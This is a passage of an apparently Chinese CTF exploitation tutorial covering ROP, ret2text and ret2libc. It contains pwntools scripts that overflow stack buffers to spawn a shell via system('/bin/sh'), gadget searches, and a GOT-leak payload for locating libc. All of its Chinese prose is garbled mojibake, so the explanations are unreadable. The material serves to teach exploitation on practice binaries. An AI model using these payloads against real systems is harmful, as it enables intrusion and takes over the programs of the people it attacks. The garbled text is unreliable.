Programming)ï¼Œå…¶ä¸»è¦æ€æƒ³æ˜¯åœ¨æ ˆç¼“å†²åŒºæº¢å‡ºçš„åŸºç¡€ä¸Šï¼Œåˆ©ç”¨ç¨‹åºä¸­å·²æœ‰çš„å°ç‰‡æ®µ (gadgets) æ¥æ”¹å˜æŸäº›å¯„å­˜å™¨æˆ–è€…å˜é‡çš„å€¼ï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚æ‰€è°“ gadgets å°±æ˜¯ä»¥ ret ç»“å°¾çš„æŒ‡ä»¤åºåˆ—ï¼Œé€šè¿‡è¿™äº›æŒ‡ä»¤åºåˆ—ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹æŸäº›åœ°å€çš„å†…å®¹ï¼Œæ–¹ä¾¿æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚ â€‹ ä¹‹æ‰€ä»¥ç§°ä¹‹ä¸º ROPï¼Œæ˜¯å› ä¸ºæ ¸å¿ƒåœ¨äºåˆ©ç”¨äº†æŒ‡ä»¤é›†ä¸­çš„ ret æŒ‡ä»¤ï¼Œæ”¹å˜äº†æŒ‡ä»¤æµçš„æ‰§è¡Œé¡ºåºã€‚ROP æ”»å‡»ä¸€èˆ¬å¾—æ»¡è¶³å¦‚ä¸‹æ¡ä»¶ï¼š 1. ç¨‹åºå­˜åœ¨æº¢å‡ºï¼Œå¹¶ä¸”å¯ä»¥æ§åˆ¶è¿”å›åœ°å€ã€‚ 2. å¯ä»¥æ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„ gadgets ä»¥åŠç›¸åº” gadgets çš„åœ°å€ã€‚ 3. å¦‚æœ gadgets æ¯æ¬¡çš„åœ°å€æ˜¯ä¸å›ºå®šçš„ï¼Œé‚£æˆ‘ä»¬å°±éœ€è¦æƒ³åŠæ³•åŠ¨æ€è·å–å¯¹åº”çš„åœ°å€äº†ã€‚ # äºŒ.ret2text # 1. åŸç† ret2text å³æ§åˆ¶ç¨‹åºæ‰§è¡Œç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç  (.text)ã€‚å…¶å®ï¼Œè¿™ç§æ”»å‡»æ–¹æ³•æ˜¯ä¸€ç§ç¬¼ç»Ÿçš„æè¿°ã€‚æˆ‘ä»¬æ§åˆ¶æ‰§è¡Œç¨‹åºå·²æœ‰çš„ä»£ç çš„æ—¶å€™ä¹Ÿå¯ä»¥æ§åˆ¶ç¨‹åºæ‰§è¡Œå¥½å‡ æ®µä¸ç›¸é‚»çš„ç¨‹åºå·²æœ‰çš„ä»£ç  (ä¹Ÿå°±æ˜¯ gadgets)ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬æ‰€è¦è¯´çš„ ROPã€‚ è¿™æ—¶ï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“å¯¹åº”è¿”å›çš„ä»£ç çš„ä½ç½®ã€‚å½“ç„¶ç¨‹åºä¹Ÿå¯èƒ½ä¼šå¼€å¯æŸäº›ä¿æŠ¤ï¼Œæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•å»ç»•è¿‡è¿™äº›ä¿æŠ¤ã€‚ æ³¨ï¼š ret2text å³æ§åˆ¶è¿”å›åœ°å€æŒ‡å‘ç¨‹åºæœ¬èº«å·²æœ‰çš„çš„ä»£ç  (.text) å¹¶æ‰§è¡Œ # 2.x64 å’Œ x86 å‡½æ•°è°ƒç”¨æ–¹å¼ä¸åŒå¯¼è‡´ ret2text å¸ƒæ ˆä¸åŒ # 2.1 å‡½æ•°è°ƒç”¨çº¦å®š _cdecl: c/c++ é»˜è®¤æ–¹å¼ï¼Œå‚æ•°ä»å³å‘å·¦å…¥æ ˆï¼Œä¸»è°ƒå‡½æ•°è´Ÿè´£æ ˆå¹³è¡¡ã€‚ _stdcall: Windows API æ–¹å¼ï¼Œå‚æ•°ä»å³å‘å·¦å…¥æ ˆï¼Œè¢«è°ƒå‡½æ•°è´Ÿè´£æ ˆå¹³è¡¡ã€‚ _fastcall: å¿«é€Ÿè°ƒç”¨æ–¹å¼ã€‚å³å°†å‚æ•°ä¼˜å…ˆä»å¯„å­˜å™¨ä¼ å…¥ï¼ˆecx å’Œ edxï¼‰ï¼Œå‰©ä¸‹çš„å‚æ•°ä»å³å‘å·¦å…¥æ ˆã€‚ç”±äºæ ˆä½äºå†…å­˜åŒºåŸŸï¼Œè€Œå¯„å­˜å™¨ä½äº cpu å†…ï¼Œå­˜å–å¿«äºå†…å­˜ã€‚ è¿™é‡Œè®²è¿°é»˜è®¤çš„ gcc è°ƒç”¨çº¦å®š_cdecl çš„ä¸€äº›ç‰¹ç‚¹ã€‚ x86 ä½¿ç”¨æ ˆä¼ é€’å‚æ•° ä½¿ç”¨ eax å­˜æ”¾è¿”å›å€¼ x64 å‰å…­ä¸ªå‚æ•°ä¾æ¬¡å­˜æ”¾äº rdiï¼Œrsiï¼Œrdxï¼Œrcxï¼Œr8ï¼Œr9 ä¸­ å¤šä½™çš„å‚æ•°å­˜æ”¾äºæ ˆä¸­ # 3. è§£æ³•ä¸¾ä¾‹ # 3.1x86 é¢˜è§£æ–¹æ³• å¯¹äºå‡½æ•°ä¼ å‚çš„å‡½æ•°ï¼Œå…¶æ ˆæ ¼å¼ä¸ºï¼š æ•…è€Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨æº¢å‡ºè¦†ç›–è¿”å›åœ°å€è¿›å…¥ func å‡½æ•°å†…éƒ¨ï¼Œå†å°†å‚æ•°ä¸€æŒ‡å‘ â€œ/bin/shâ€ çš„å‚¨å­˜åœ°å€å³å¯ã€‚å…¶ä¸­è¦æ³¨æ„çš„æ˜¯ r å¤„éœ€è¦æˆ‘ä»¬è¿›è¡Œåƒåœ¾æ•°æ®çš„å¡«å……ã€‚ ç°åœ¨åˆ©ç”¨ gdb æŸ¥æ‰¾ func å‡½æ•°åœ°å€å’Œ sh å­˜æ”¾åœ°å€ï¼ˆå…·ä½“åç§»é‡ç”± ida æŸ¥çœ‹ä¸å†è¯¦ç»†è®²è§£ï¼‰ æ³¨æ„è¿™ç§ x86 æ˜¯è¦è¿›å…¥ func å‡½æ•°ï¼Œç„¶åæŠŠå‚æ•°ä¸€è¦†ç›–æˆ bin/sh, å› æ­¤æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œpayload = padding*b'a' + p32 (ret_addr) + p32 (0) + p32 (sh_addr) ä¹¦å†™ payloadï¼š è¡Œé«˜äº®12345678910111213141516171819202122232425`from pwn import * context(log_level=&#x27;debug&#x27;,arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;) file = &#x27;./ret2text_func2_x86&#x27; io = process(file)elf = ELF(file)rop = ROP(file) sh_addr = 0x804c018ret_addr = elf.symbols[&#x27;func&#x27;]padding = 0x14 payload = padding*b&#x27;a&#x27; + p32(ret_addr) + p32(0) + p32(sh_addr) dem = b&#x27;inputs:&#x27;io.sendlineafter(dem,payload)io.interactive()` æˆåŠŸ # 3.2x64 è§£é¢˜æ–¹æ³• å¯¹ x64 çš„å‚æ•°ï¼Œå¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œå‰å…­ä¸ªå‚æ•°å‚¨å­˜åœ¨å¯„å­˜å™¨å†…ï¼Œæ— æ³•ç›´æ¥ä½¿ç”¨ç®€å•çš„æ ˆæº¢å‡ºä¿®æ”¹å¯„å­˜å™¨å†…å®¹ï¼Œè¿™æ—¶å€™æˆ‘ä»¬éœ€è¦è§£é™¤ ROPgadget å·¥å…·è¿›è¡Œè¾…åŠ©ã€‚ ROP (Return Oriented Programming)ï¼Œå³è¿”å›å¯¼å‘ç¼–ç¨‹ï¼Œé€šè¿‡æ ˆæº¢å‡ºå†…å®¹è¦†ç›–è¿”å›åœ°å€ï¼Œä½¿å…¶è·³è½¬åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­å·²æœ‰çš„ç‰‡æ®µä»£ç ä¸­æ‰§è¡Œæˆ‘ä»¬é€‰æ‹©çš„ä»£ç æ®µã€‚ çŸ¥é“äº† ROP å·¥å…·çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬éœ€è¦åšçš„æ˜¯ ä¿®æ”¹ rdi çš„å€¼ï¼ˆå¯ä½¿ç”¨ä»£ç  pop rdi ; retï¼‰ åœ¨æ ˆä¸­æ”¾å…¥â€˜bin/shâ€™ç»ç”± pop æäº¤ç»™ rdi è¿›å…¥ func å‡½æ•°å†…è°ƒç”¨ system å‡½æ•° åˆ©ç”¨ gdb æŸ¥æ‰¾ func å‡½æ•°åœ°å€å’Œ sh å­˜æ”¾åœ°å€ï¼ˆå…·ä½“åç§»é‡ç”± ida æŸ¥çœ‹ä¸å†è¯¦ç»†è®²è§£ï¼‰ï¼š åˆ©ç”¨ ROPgadget æŸ¥æ‰¾éœ€è¦çš„ä»£ç è¡Œ --pop rdi ; ret è¡Œé«˜äº®1ROPgadget --binary ret2text_func2_x64 --only &#x27;pop|ret&#x27; payload = padding*b'a' + p64 (pop_rdi_ret) + p64 (sh_addr)+ p64 (ret_addr) #64 ä½ä¸‰æ­¥èµ°åŸåˆ™ æ„é€  payloadï¼š è¡Œé«˜äº®1234567891011121314151617181920212223242526`from pwn import *context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)#context(arch=&#x27;arm64&#x27;,os=&#x27;linux&#x27;)#æ‰“å¼€è·¯å¾„file = &#x27;./ret2text_func2_x64&#x27; io = process(file) elf = ELF(file) rop = ROP(file) #è°ƒè¯•gdb.attach(io)pause()sh_addr = 0x404028 ret_addr = elf.symbols[&#x27;func&#x27;] #è¿™ä¸ªå¯ä»¥è‡ªå·±æ‰¾ï¼Œä¹Ÿå¯ä»¥è°ƒç”¨å‡½æ•°å¸®ä½ æ‰¾ pop_rdi_ret = 0x40121b #è¿™ä¸ªç”¨gadgetå°±è¡Œ padding = 0x10payload = padding*b&#x27;a&#x27; + p64(pop_rdi_ret) + p64(sh_addr)+ p64(ret_addr) #64ä½ä¸‰æ­¥èµ°åŸåˆ™ dem = b&#x27;inputs:&#x27; io.sendlineafter(dem,payload) io.interactive()` è¿è¡ŒæˆåŠŸ pwn æ‰ # 3.3x86 ä¸¾ä¾‹ å…¶å®ï¼Œåœ¨æ ˆæº¢å‡ºçš„åŸºæœ¬åŸç†ä¸­ï¼Œæˆ‘ä»¬å·²ç»ä»‹ç»äº†è¿™ä¸€ç®€å•çš„æ”»å‡»ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å†ç»™å‡ºå¦å¤–ä¸€ä¸ªä¾‹å­ï¼Œbamboofox ä¸­ä»‹ç» ROP æ—¶ä½¿ç”¨çš„ ret2text çš„ä¾‹å­ã€‚ é¦–å…ˆï¼ŒæŸ¥çœ‹ä¸€ä¸‹ç¨‹åºçš„ä¿æŠ¤æœºåˆ¶ è¡Œé«˜äº®123456âœ ret2text checksec ret2text Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) å¯ä»¥çœ‹å‡ºç¨‹åºæ˜¯ 32 ä½ç¨‹åºï¼Œå…¶ä»…ä»…å¼€å¯äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤ã€‚ç„¶åï¼Œæˆ‘ä»¬ä½¿ç”¨ IDA æ¥æŸ¥çœ‹æºä»£ç ã€‚ è¡Œé«˜äº®1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v4; // [sp+1Ch] [bp-64h]@1 setvbuf(stdout, 0, 2, 0); setvbuf(_bss_start, 0, 1, 0); puts(&quot;There is something amazing here, do you know anything?&quot;); gets((char *)&amp;v4); printf(&quot;Maybe I will tell you next time !&quot;); return 0;&#125; å¯ä»¥çœ‹å‡ºç¨‹åºåœ¨ä¸»å‡½æ•°ä¸­ä½¿ç”¨äº† gets å‡½æ•°ï¼Œæ˜¾ç„¶å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´ã€‚æ­¤ååˆå‘ç° è¡Œé«˜äº®1234567891011121314151617181920212223.text:080485FD secure proc near.text:080485FD.text:080485FD input = dword ptr -10h.text:080485FD secretcode = dword ptr -0Ch.text:080485FD.text:080485FD push ebp.text:080485FE mov ebp, esp.text:08048600 sub esp, 28h.text:08048603 mov dword ptr [esp], 0 ; timer.text:0804860A call _time.text:0804860F mov [esp], eax ; seed.text:08048612 call _srand.text:08048617 call _rand.text:0804861C mov [ebp+secretcode], eax.text:0804861F lea eax, [ebp+input].text:08048622 mov [esp+4], eax.text:08048626 mov dword ptr [esp], offset unk_8048760.text:0804862D call ___isoc99_scanf.text:08048632 mov eax, [ebp+input].text:08048635 cmp eax, [ebp+secretcode].text:08048638 jnz short locret_8048646.text:0804863A mov dword ptr [esp], offset command ; &quot;/bin/sh&quot;.text:08048641 call _system åœ¨ secure å‡½æ•°åˆå‘ç°äº†å­˜åœ¨è°ƒç”¨ system (&quot;/bin/sh&quot;) çš„ä»£ç ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬ç›´æ¥æ§åˆ¶ç¨‹åºè¿”å›è‡³ 0x0804863Aï¼Œé‚£ä¹ˆå°±å¯ä»¥å¾—åˆ°ç³»ç»Ÿçš„ shell äº†ã€‚ ä¸‹é¢å°±æ˜¯æˆ‘ä»¬å¦‚ä½•æ„é€  payload äº†ï¼Œé¦–å…ˆéœ€è¦ç¡®å®šçš„æ˜¯æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶çš„å†…å­˜çš„èµ·å§‹åœ°å€è·ç¦» main å‡½æ•°çš„è¿”å›åœ°å€çš„å­—èŠ‚æ•°ã€‚ è¡Œé«˜äº®123.text:080486A7 lea eax, [esp+1Ch].text:080486AB mov [esp], eax ; s.text:080486AE call _gets å¯ä»¥çœ‹åˆ°è¯¥å­—ç¬¦ä¸²æ˜¯é€šè¿‡ç›¸å¯¹äº esp çš„ç´¢å¼•ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¿›è¡Œè°ƒè¯•ï¼Œå°†æ–­ç‚¹ä¸‹åœ¨ call å¤„ï¼ŒæŸ¥çœ‹ espï¼Œebpï¼Œå¦‚ä¸‹ è¡Œé«˜äº®1234567gefâ¤ b *0x080486AEBreakpoint 1 at 0x80486ae: file ret2text.c, line 24.gefâ¤ rThere is something amazing here, do you know anything?Breakpoint 1, 0x080486ae in main () at ret2text.c:2424 gets(buf); â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ è¡Œé«˜äº®12345678910â”€â”€â”€â”€â”€â”€[ registers ]â”€â”€â”€â”€$eax : 0xffffcd5c â†’ 0x08048329 â†’ &quot;__libc_start_main&quot;$ebx : 0x00000000$ecx : 0xffffffff$edx : 0xf7faf870 â†’ 0x00000000$esp : 0xffffcd40 â†’ 0xffffcd5c â†’ 0x08048329 â†’ &quot;__libc_start_main&quot;$ebp : 0xffffcdc8 â†’ 0x00000000$esi : 0xf7fae000 â†’ 0x001b1db0$edi : 0xf7fae000 â†’ 0x001b1db0$eip : 0x080486ae â†’ &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt; å¯ä»¥çœ‹åˆ° esp ä¸º 0xffffcd40ï¼Œebp ä¸º 0xffffcdc8ï¼ŒåŒæ—¶ s ç›¸å¯¹äº esp çš„ç´¢å¼•ä¸º esp+0x1cï¼Œå› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥æ¨æ–­ s çš„åœ°å€ä¸º 0xffffcd5c s ç›¸å¯¹äº ebp çš„åç§»ä¸º 0x6c s ç›¸å¯¹äºè¿”å›åœ°å€çš„åç§»ä¸º 0x6c+4 æœ€åçš„ payload å¦‚ä¸‹ï¼š è¿™ç§ x86 ç›´æ¥å°±æ˜¯ä¸»å‡½æ•°ä¸­æœ‰è¾“å…¥å‡½æ•°ï¼Œå…·ä½“é¢˜ç›®ä¸­äºŒè€…åŒºåˆ«ä¸å¤§ï¼Œæœ‰æ—¶éƒ½èƒ½æ‰“é€š è¡Œé«˜äº®1234567##!/usr/bin/env pythonfrom pwn import *sh = process(&#x27;./ret2text&#x27;)target = 0x804863ash.sendline(&#x27;A&#x27; * (0x6c+4) + p32(target))sh.interactive() # 3.3x86 é¢˜è§£è¡¥å……ç–‘é—®ï¼ˆä¸ºä»€ä¹ˆåŠ  p32 (0)ï¼‰- æ ˆå¯¹é½ å¯¹äºæœ¬é¢˜çš„å‡½æ•°ä¼ å‚ï¼Œæˆ‘ä»¬çš„æ ˆå¸§æ„é€ åˆæ­¥æƒ³æ³•å¦‚å›¾ ebp â€˜aaaaâ€™ r return to func å‚æ•°ä¸€ â€œ/bin/shâ€ è¾“å…¥é€‚é‡åƒåœ¾å¡«å…… padding * b 'a' è¦†ç›–è¿”å›åœ°å€æŒ‡å‘ func å‡½æ•° p32 (ret_addr) å‚æ•° &quot;/bin/sh&quot; åœ°å€ åˆ™ payload = padding*b'a' + p32 (ret_addr) + p32 (sh_addr) ç„¶è€Œè¿™æ ·çš„è„šæœ¬åœ¨æ”»å‡»æ—¶ä¼šå‡ºé”™ã€‚åŸå› åœ¨äºï¼š æ­£å¸¸çš„å‡½æ•°è°ƒç”¨ call æ¥è¾¾åˆ° push eipï¼›jmp çš„ä½œç”¨ï¼Œç»è¿‡åˆæ­¥ payload æ„é€ çš„æ”»å‡»å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæ˜¯é€šè¿‡è¦†ç›– return è¾¾åˆ° jmp çš„ä½œç”¨çš„ï¼Œå¹¶æ²¡æœ‰åƒ call ä¸€æ · push eip åˆ°æ ˆä¸­ã€‚ æ•…è€Œ ret æ‰§è¡Œåï¼Œebp åä¸ºæˆ‘ä»¬è¾“å…¥çš„å‚æ•°è€Œé eip åŸåœ°å€ï¼ˆå‡½æ•°ç»“æŸåè¿”å›çš„åœ°å€ï¼‰ï¼Œè€Œå‡½æ•°è¯»å–å‚æ•°çš„ä½ç½®åœ¨ä¸Šæ–‡ä¸­å·²ç»å±•ç¤ºï¼Œä¸º ebp+0x8ã€‚æ•…è€Œåœ¨åˆ©ç”¨ ret2text è¦†ç›– pwn é¢˜æ—¶å€™ï¼Œéœ€è¦è‡ªè¡ŒåŠ å…¥ä¸€è¡Œæ ˆå¸§çš„å¡«å……ã€‚ # ä¸‰.ret2libc # I. çµé­‚äº”é—® 1. æ²¡æœ‰å†™ system å°±ä¸€å®šæ²¡æœ‰ systemï¼Ÿ ç­”ï¼šæœ‰ systemï¼Œ åœ¨ libc é‡Œé¢ï¼Œåˆ«äººå†™å¥½çš„ 2. æ€æ‰¾åˆ° libc åŸºåœ°å€ ï¼Ÿ ç­”ï¼šä½¿ç”¨è¾“å‡º libc å…¶ä¸­çš„å‡½æ•°åœ°å€ï¼Œä»è€Œè®¡ç®—åŸºåœ°å€ 3. æ€ä¹ˆè¾“å‡º libc å…¶ä¸­çš„å‡½æ•°åœ°å€ï¼Ÿ ç­”ï¼šæ¨¡ä»¿ç¨‹åºå¦‚ä½•æ‰¾ libc å…¶ä¸­çš„å‡½æ•°åœ°å€çš„æ–¹å¼å»å¯»æ‰¾ã€‚ 4. æ€æŠŠ GOT è¡¨é¡¹å†…å®¹æ‰“å°å‡ºæ¥ã€‚ ç­”ï¼šåˆ©ç”¨è¾“å‡ºå‡½æ•°æ³„éœ² got è¡¨å†…å®¹ã€‚ 5. æ€ä¹ˆæ‰¾åˆ° system binsh åœ°å€ ç­”ï¼šåˆ©ç”¨åç§»è®¡ç®— å¸¸ç”¨ä¼šç”¨åˆ°çš„æŒ‡ä»¤ï¼š è¡Œé«˜äº®123`readelf -a b|less # ROPgadget --binary æ–‡ä»¶å --only &quot;pop|ret&quot; #æ‰¾ç‰¹å®šgadget#å¯„å­˜å™¨ldd æ–‡ä»¶å #çœ‹åŠ¨æ€é“¾æ¥ # II. è‡ªå·±çš„ç†è§£ 1. æˆ‘ä»¬å¦‚ä½•å¾—åˆ° system å‡½æ•°çš„åœ°å€å‘¢ï¼Ÿè¿™é‡Œå°±ä¸»è¦åˆ©ç”¨äº†ä¸¤ä¸ªçŸ¥è¯†ç‚¹ â€‹ system å‡½æ•°å±äº libcï¼Œè€Œ libc.so åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‡½æ•°ä¹‹é—´ç›¸å¯¹åç§»æ˜¯å›ºå®šçš„ã€‚ å³ä½¿ç¨‹åºæœ‰ ASLR ä¿æŠ¤ï¼Œä¹Ÿåªæ˜¯é’ˆå¯¹äºåœ°å€ä¸­é—´ä½è¿›è¡Œéšæœºï¼Œæœ€ä½çš„ 12 ä½å¹¶ä¸ä¼šå‘ç”Ÿæ”¹å˜ã€‚è€Œ libc åœ¨ github ä¸Šæœ‰äººè¿›è¡Œæ”¶é›† â€‹ æ‰€ä»¥å¦‚æœæˆ‘ä»¬çŸ¥é“ libc ä¸­æŸä¸ªå‡½æ•°çš„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç¡®å®šè¯¥ç¨‹åºåˆ©ç”¨çš„ libcã€‚è¿›è€Œæˆ‘ä»¬å°±å¯ä»¥çŸ¥é“ system å‡½æ•°çš„åœ°å€ã€‚ 2. é‚£ä¹ˆå¦‚ä½•å¾—åˆ° libc ä¸­çš„æŸä¸ªå‡½æ•°çš„åœ°å€å‘¢ï¼Ÿ â€‹ æˆ‘ä»¬ä¸€èˆ¬å¸¸ç”¨çš„æ–¹æ³•æ˜¯é‡‡ç”¨ got è¡¨æ³„éœ²ï¼Œå³è¾“å‡ºæŸä¸ªå‡½æ•°å¯¹åº”çš„ got è¡¨é¡¹çš„å†…å®¹ã€‚å½“ç„¶ï¼Œç”±äº libc çš„å»¶è¿Ÿç»‘å®šæœºåˆ¶ï¼Œæˆ‘ä»¬éœ€è¦æ³„æ¼å·²ç»æ‰§è¡Œè¿‡çš„å‡½æ•°çš„åœ°å€ã€‚ æˆ‘ä»¬è‡ªç„¶å¯ä»¥æ ¹æ®ä¸Šé¢çš„æ­¥éª¤å…ˆå¾—åˆ° libcï¼Œä¹‹ååœ¨ç¨‹åºä¸­æŸ¥è¯¢åç§»ï¼Œç„¶åå†æ¬¡è·å– system åœ°å€ï¼Œä½†è¿™æ ·æ‰‹å·¥æ“ä½œæ¬¡æ•°å¤ªå¤šï¼Œæœ‰ç‚¹éº»çƒ¦ï¼Œè¿™é‡Œç»™å‡ºä¸€ä¸ª libc çš„åˆ©ç”¨å·¥å…·ï¼Œå…·ä½“ç»†èŠ‚è¯·å‚è€ƒ readme https://github.com/lieanu/LibcSearcher æ­¤å¤–ï¼Œåœ¨å¾—åˆ° libc ä¹‹åï¼Œå…¶å® libc ä¸­ä¹Ÿæ˜¯æœ‰ /bin/sh å­—ç¬¦ä¸²çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¸€èµ·è·å¾— /bin/sh å­—ç¬¦ä¸²çš„åœ°å€ã€‚ è¿™é‡Œæˆ‘ä»¬æ³„éœ² libc_start_main çš„åœ°å€ï¼Œè¿™æ˜¯å› ä¸ºå®ƒæ˜¯ç¨‹åºæœ€åˆè¢«æ‰§è¡Œçš„åœ°æ–¹ã€‚åŸºæœ¬åˆ©ç”¨æ€è·¯å¦‚ä¸‹ 1. æ³„éœ² libc_start_main åœ°å€ 2. è·å– libc ç‰ˆæœ¬ 3. è·å– system åœ°å€ä¸ /bin/sh çš„åœ°å€ 4. å†æ¬¡æ‰§è¡Œæºç¨‹åº 5. è§¦å‘æ ˆæº¢å‡ºæ‰§è¡Œ system (â€˜/bin/shâ€™)** # III. è§£æ³•ä¸¾ä¾‹ # 1)x64: # 0. è°ƒç”¨çº¦å®š 64 ä½ç³»ç»Ÿä¸­ä½¿ç”¨å¯„å­˜å™¨ä¼ é€’å‚æ•°ï¼šrdiã€rsiã€rdxã€rcxã€r8ã€r9ï¼ˆ1-6 ä¸ªå‚æ•°ï¼‰ å‚è€ƒï¼šhttp://abcdxyzk.github.io/blog/2012/11/23/assembly-args/ è¦æ„é€  write (1,buf2,20)ï¼Œéœ€è¦æ§åˆ¶ 3 ä¸ªå‚æ•°ï¼šrdiã€rsiã€rdxï¼Œ ç¬¬ 3 ä¸ªå‚æ•°ä»£è¡¨è¾“å‡ºçš„ sizeï¼Œå¦‚æœæ²¡æœ‰ rdx çš„ gadget å¯ä»¥æš‚æ—¶ä¸ç®¡ï¼Œè¾“å‡ºå¤šå°‘æ— æ‰€è°“ï¼Œ åœ¨ä¸‹é¢æˆ‘ä»¬æ„é€  payload çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¸å†™ç¬¬ 3 ä¸ªå‚æ•° # 0.1 ä¸¾ä¾‹ è¡Œé«˜äº®1234567891011å½“æˆ‘ä»¬è¦†ç›–åˆ°rbpåå›å¿†å‡½æ•°è°ƒç”¨çš„æµç¨‹ï¼ŒæŠŠrbpçš„ä¸‹ä¸€ä¸ªåœ°å€å¼€å§‹åŸæ¥å­˜çš„ä¸œè¥¿è¦†ç›–æˆæˆ‘ä»¬æƒ³è¦çš„åœ°å€ç¬¬ä¸€æ¬¡ï¼š ç¬¬äºŒæ¬¡å›åˆ°main----rbp(esp0-16)(ida-&gt;s)ï¼šè¦†ç›–å®Œ ----åŒç†----esp0-8(ida-&gt;r): &quot;pop_rdi_rsi_rdxret&quot; ----&quot;pop_rdi_ret&quot;----esp0: &quot;rdi&quot; &quot;1&quot; ----&quot;/bin/sh_addr&quot;----esp0+8: &#x27;pop_rsi_r15_ret&#x27; ----&quot;system_addr&quot; ----esp+16:&quot;leak_func_got&quot; è¿™æ¬¡å¸ƒæ ˆå°±åƒret_textä¸­çš„systemå‡½æ•°ä¸€æ ·æ¥å¸ƒ----esp+24:&quot;r15&quot; 8ä½å¯ä»¥æ˜¯&quot;deadbeef&quot;----esp+32:&quot;æ³„éœ²GOTçœŸæ­£åœ°å€çš„å‡½æ•°å¦‚write_sym&quot;----esp+40:&#x27;è¿”å›åœ°å€&#x27; # 1.padding é¦–å…ˆæˆ‘ä»¬éœ€è¦ç¡®å®š paddingï¼Œåœ¨å“ªé‡Œæº¢å‡ºï¼ŒæŠŠè¿™ä¸ªç©ºå¡«æ»¡ï¼Œæº¢å‡ºåˆ° rbp å®Œ ----padding å’Œä»¥å‰ä¸€æ ·ï¼Œçœ‹å“ªé‡Œ gets æˆ–è€… read å‡½æ•°ï¼Œè¿™é‡Œå…¶å®å°±æ˜¯ scanf ---- å¯ä»¥é€šè¿‡ ida æˆ–è€…åŠ¨æ€è°ƒè¯•å¾—åˆ° ---- å‚è€ƒä»¥å‰çš„é¢˜ç›®ï¼Œåƒ buuctf å‰å‡ é“ rip,level.. # 2. ç¬¬ä¸€æ¬¡æº¢å‡ºï¼Œç›®æ ‡è·å¾—çš„ libc æŸä¸ªå‡½æ•°çš„çœŸå®åœ°å€ # 2.1 ç¬¬ä¸€æ¬¡æº¢å‡º æ¯”å¦‚ï¼šä»¥ä¸‹æ˜¯ write å‡½æ•°ä¸ºä¾‹ è¡Œé«˜äº®1234567891011121314151617leak_func_name =&#x27;write&#x27; leak_func_got = elf.got[leak_func_name] # leak_func_gotæ³„éœ²çš„gotè¡¨ å»idaä¸Šçœ‹writeçš„åœ°å€ #got.plt:0000000000404018 48 unk_404018 db 48h ; H OFF64 EXTDEF [extern,404048]=404048 (write)#leak_func_got = 404018return_addr = elf.symbols[&#x27;dofunc&#x27;]write_sym = elf.symbols[&#x27;write&#x27;]pop_rdi_ret = 0x4011fb #ç”¨ROPgadgetæŸ¥çš„pop_rsi_r15_ret = 0x4011f9#åŒä¸Špayload = b&#x27;a&#x27;* padding + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(leak_func_got) + p64(0xdeadbeef)# äº§ç”Ÿæº¢å‡ºçš„å­—ç¬¦ä¸² pop_rdi_ret rdiå­˜çš„å€¼ pop_rsi_r15_ret leak_func_gotæ³„éœ²çš„gotè¡¨ r15# ç¬¬ä¸€ä¸ªå‚æ•° ç¬¬äºŒä¸ªå‚æ•°ï¼ˆrdxç¬¬ä¸‰ä¸ªå‚æ•°æ²¡æœ‰å…ˆä¸ç®¡ï¼‰# ç¬¬ä¸€æ­¥ ç¬¬2æ­¥rdi ã€ ç¬¬ä¸‰æ­¥ pltè¡¨ ã€‘ ç¬¬å››æ­¥gotè¡¨ ç¬¬äº”æ­¥å¡«deedbeef payload = payload + p64(write_sym) + p64(return_addr) # ç¬¬å…­æ­¥writeåç§»åœ°å€ ç¬¬ä¸ƒæ­¥è¿”å›åœ°å€ï¼ˆè¿›å…¥ç¬¬äºŒæ¬¡æº¢å‡ºçš„è¿”å›åœ°å€ï¼‰ delimiter = &#x27;input:&#x27;io.sendlineafter(delimiter, payload) # 2.2 æ”¶è·è¿™ä¸ªå‡½æ•°çš„çœŸå®åœ°å€ è¡Œé«˜äº®12345678910gets_addr=u64(p.recv()[:8]) #p.recv()[:8]: è¿™ä¸ªéƒ¨åˆ†æ˜¯å°†ä»ç®¡é“ä¸­æ¥æ”¶åˆ°çš„æ•°æ®çš„å‰ 8 ä¸ªå­—èŠ‚åˆ‡ç‰‡å‡ºæ¥ã€‚u64æ¢æˆæ— ç¬¦å·æ•´æ•°#puts_addr = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;)) # æ¥æ”¶putsçš„çœŸå®åœ°å€#p.recv(6): ä»ç®¡é“ä¸­æ¥æ”¶ 6 